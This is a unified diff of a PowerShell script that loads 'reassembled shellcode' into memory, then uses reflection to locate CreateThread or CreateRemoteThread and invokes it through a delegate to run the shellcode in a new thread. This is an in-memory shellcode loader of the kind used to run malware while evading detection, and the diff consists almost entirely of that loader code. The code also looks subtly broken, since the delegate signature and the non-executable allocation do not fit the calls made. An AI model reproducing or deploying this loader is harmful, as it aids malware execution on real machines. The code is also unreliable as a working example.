@@ -40,18 +40,25 @@ $address = [Runtime.InteropServices.Marshal]::AllocHGlobal($byteArray.Length)
 if ($address -ne [IntPtr]::Zero) {
     Write-Host "Reassembled Shellcode placed in RAM at: $address"
     
-    # 1. Surgically find CreateThread just like we did VirtualAlloc
+    # 1. Use the SAME surgical method that worked for VirtualAlloc
+    # In some versions of mscorlib, it is called 'CreateThread' or 'CreateRemoteThread'
     $ctMethod = $native.GetMethod("CreateThread", [Reflection.BindingFlags]"Static, Public, NonPublic")
+    
+    # Check if we found it; if not, look for its 'Twin'
+    if (-not $ctMethod) { $ctMethod = $native.GetMethod("CreateRemoteThread", [Reflection.BindingFlags]"Static, Public, NonPublic") }
+    
     $ctAddr = $ctMethod.MethodHandle.GetFunctionPointer()
+    Write-Host "Launcher found at: $ctAddr"
 
-    # 2. Create the "Launcher" (Delegate)
+    # 2. Create the "Launcher" Delegate
+    # We use the full [System.Func] path to avoid the "Overload" error
     $ctDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctAddr, [Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
 
-    # 3. Launch the Shellcode in a background thread
+    # 3. Launch the Shellcode
     Write-Host "Launching Thread..."
     $ctDelegate.Invoke([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
     
-    # 4. Keep PowerShell alive for 5 seconds so the thread can print "Hello World"
+    # 4. Keep PowerShell alive to see the result
     Start-Sleep -Seconds 5
 }
 
